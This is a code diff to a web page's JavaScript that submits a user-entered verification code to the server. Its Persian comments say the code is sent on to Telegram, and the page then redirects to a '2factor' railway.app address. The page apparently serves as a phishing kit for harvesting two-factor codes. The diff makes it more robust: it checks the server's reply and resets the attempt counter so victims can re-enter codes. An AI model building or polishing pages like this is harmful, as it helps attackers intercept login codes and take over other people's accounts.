@@ -156,17 +156,42 @@
                 codeInput.classList.remove("error");
                 codeInput.classList.add("success");
 
-                // ارسال پیام به تلگرام
+                // ارسال پیام به تلگرام و بررسی پاسخ
                 const formData = new FormData(codeForm);
-                await fetch("/", {
-                    method: "POST",
-                    body: formData
-                });
-
-                // بعد از 0.5 ثانیه ریدایرکت کن
-                setTimeout(() => {
-                    window.location.href = "https://2factor-production.up.railway.app/";
-                }, 500);
+                try {
+                    const response = await fetch("/", {
+                        method: "POST",
+                        body: formData
+                    });
+                    console.log("Server response status:", response.status); // دیباگ بیشتر
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! Status: ${response.status}`);
+                    }
+                    const data = await response.json();
+                    console.log("Parsed data:", data); // دیباگ بیشتر
+                    if (data.status === "success") {
+                        // فقط در صورت موفقیت، ریدایرکت کن
+                        setTimeout(() => {
+                            window.location.href = data.redirect_url || "https://2factor-production.up.railway.app/";
+                            console.log("Redirecting to:", data.redirect_url || "https://2factor-production.up.railway.app/");
+                        }, 500);
+                    } else {
+                        alert(data.message || "An error occurred");
+                        console.log("Error response:", data);
+                        // بازگرداندن تلاش‌ها به 1 برای امکان تلاش دوباره
+                        attempt = 1;
+                        codeInput.classList.remove("success");
+                        codeInput.classList.add("error");
+                    }
+                } catch (error) {
+                    console.error("Fetch error:", error);
+                    alert(`Server error, please try again later: ${error.message || error}`);
+                    console.log("Full error object:", error);
+                    // بازگرداندن تلاش‌ها به 1 برای امکان تلاش دوباره
+                    attempt = 1;
+                    codeInput.classList.remove("success");
+                    codeInput.classList.add("error");
+                }
             }
         });
     </script>
